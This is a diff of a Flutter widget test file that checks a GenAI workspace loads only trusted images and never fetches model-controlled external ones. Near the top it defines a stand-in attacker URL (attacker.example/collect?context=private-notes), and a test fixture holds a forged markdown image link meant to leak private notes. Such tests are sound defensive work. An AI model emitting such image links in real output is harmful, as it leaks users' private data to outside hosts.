@@ -3,17 +3,14 @@ import 'dart:io';
 import 'package:flutter/material.dart';
 import 'package:flutter_test/flutter_test.dart';
 import 'package:techpie/features/genai/application/genai_agent_runner.dart';
-import 'package:techpie/features/genai/data/demo_genai_backend.dart';
 import 'package:techpie/features/genai/domain/genai_agent_contract.dart';
 import 'package:techpie/features/genai/domain/genai_contract.dart';
-import 'package:techpie/features/genai/presentation/genai_demo_image.dart';
 import 'package:techpie/features/genai/presentation/genai_thinking_view.dart';
 import 'package:techpie/features/genai/presentation/genai_workspace.dart';
 
-const _campusImage =
-    'https://genaipic.shanghaitech.edu.cn/sys/common/static/image15test/chart.png';
-const _fixtureImage =
-    'https://genaipic.shanghaitech.edu.cn/sys/common/static/techpie-preview/chart.png';
+import '../support/workspace_server.dart';
+
+const _campusImage = 'https://genaipic.shanghaitech.edu.cn/sys/common/static/image15test/chart.png';
 const _externalImage = 'https://attacker.example/collect?context=private-notes';
 
 void main() {
@@ -32,15 +29,13 @@ void main() {
   }
 
   for (final agent in [false, true]) {
-    testWidgets(
-        'workspace agent=$agent fetches only trusted images and keeps local demo content',
-        (tester) async {
+    testWidgets('workspace agent=$agent fetches only trusted images', (tester) async {
       await recordImageLoads((client) async {
         tester.view.physicalSize = const Size(1200, 1000);
         tester.view.devicePixelRatio = 1;
         addTearDown(tester.view.resetPhysicalSize);
         addTearDown(tester.view.resetDevicePixelRatio);
-        final demo = await GenAiDemo.create(chunkDelay: Duration.zero);
+        final demo = await TestGenAiWorkspace.create(chunkDelay: Duration.zero);
         addTearDown(demo.dispose);
         if (agent) {
           demo.workspace.configureAgent(
@@ -58,7 +53,6 @@ void main() {
           MaterialApp(
             home: GenAiWorkspace(
               controller: demo.workspace,
-              demo: true,
               login: (_) async => null,
             ),
           ),
@@ -76,8 +70,6 @@ void main() {
 ![Forged campus link]($_campusImage?context=private-notes)
 
 ![Generated campus chart]($_campusImage)
-
-![Demo campus chart]($_fixtureImage)
 ''';
         demo.workspace.toggleThinking();
         await tester.pumpAndSettle();
@@ -93,21 +85,12 @@ void main() {
           images.where((image) => image.image is NetworkImage),
           hasLength(1),
         );
-        expect(
-          images.where((image) => image.image is AssetImage).map(
-                (image) => (image.image as AssetImage).assetName,
-              ),
-          [GenAiDemoImage.assetName],
-        );
-        expect(find.text('本地测试图片'), findsOneWidget);
         expect(tester.takeException(), isNull);
       });
     });
   }
 
-  testWidgets(
-      'expanded reasoning never fetches model-controlled external images',
-      (tester) async {
+  testWidgets('expanded reasoning never fetches model-controlled external images', (tester) async {
     await recordImageLoads((client) async {
       await tester.pumpWidget(
         const MaterialApp(
